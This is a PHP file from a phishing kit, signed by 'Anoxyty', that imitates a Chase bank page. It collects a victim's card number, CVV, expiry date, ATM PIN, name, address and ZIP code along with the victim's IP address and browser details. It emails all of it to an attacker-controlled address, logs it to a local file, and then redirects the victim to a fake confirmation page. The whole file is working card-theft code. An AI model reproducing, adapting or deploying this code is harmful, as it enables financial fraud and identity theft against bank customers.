<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/

	ob_start();
session_start();
	include '../data.php';
	include '../func.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if (hash_equals($_SESSION['token'], $_POST['token'])) {
		
		$_SESSION['cc'] 	  = $_POST['cc'];
		$_SESSION['cvv'] 	  = $_POST['cvv'];
		$_SESSION['expdate'] 	  = $_POST['expdate'];
		$_SESSION['atm'] 	  = $_POST['atm'];
		$_SESSION['noc'] 	  = $_POST['noc'];
		$_SESSION['stradd'] 	  = $_POST['stradd'];
		$_SESSION['zip'] 	  = $_POST['zip'];

		$code = <<<EOT
============== [ CHASE Card | ]🔥 ==============
[NAME ON CARD] 		: {$_SESSION['noc']}
[CARD NUMBER] 		: {$_SESSION['cc']}
[CVV]		: {$_SESSION['cvv']}
[EXPIRY DATE] 		: {$_SESSION['expdate']}
[ATM]		: {$_SESSION['atm']}
[STREET ADDRESS] 		: {$_SESSION['stradd']}
[ZIP CODE] 		: {$_SESSION['zip']}

	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./💼 CHASE By Anoxyty💼 ] =============
\r\n\r\n
EOT;

		$subject = "💼 CHASE Card By Anoxyty💼  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <wellsby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($data,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: ../fina?&web/auth/#/logon/recognizeUser/confirmation");
        exit();
	} else {
		header("Location: ../404?");
		exit();
	}
?>